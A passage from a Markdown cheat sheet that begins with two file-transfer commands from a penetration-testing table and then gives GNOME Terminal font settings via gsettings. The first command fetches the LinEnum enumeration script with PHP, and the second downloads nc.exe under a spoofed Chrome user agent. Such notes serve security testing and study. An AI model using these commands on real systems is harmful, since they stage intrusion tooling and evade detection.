|     `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`      |          Download a file using PHP          |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

# 🔴 Tips and Tricks

## GNOME

**GNOME gsettings Cheatsheet** :
- https://en.paxa.dev/posts/gnome-cheatsheet

### Gnome Terminal Font

Custom Font - 

```shell
mkdir -p ~/.local/share/fonts
```

Update Font - 

```shell
fc-cache -fv
```

Get Font - 

```shell
gsettings get org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ font
```

Set Font - 

```shell
gsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ font 'JetBrainsMono Nerd Font Mono 12'
```

Fallback Font Status and update - 

```shell
gsettings get org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ use-system-font

gsettings set org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ use-system-font false
```

Reset Font - 

```shell
PROFILE=$(gsettings get org.gnome.Terminal.ProfilesList default | tr -d "'")

gsettings reset org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ font

gsettings reset org.gnome.Terminal.Legacy.Profile:/org/gnome/terminal/legacy/profiles:/:$PROFILE/ use-system-font
```




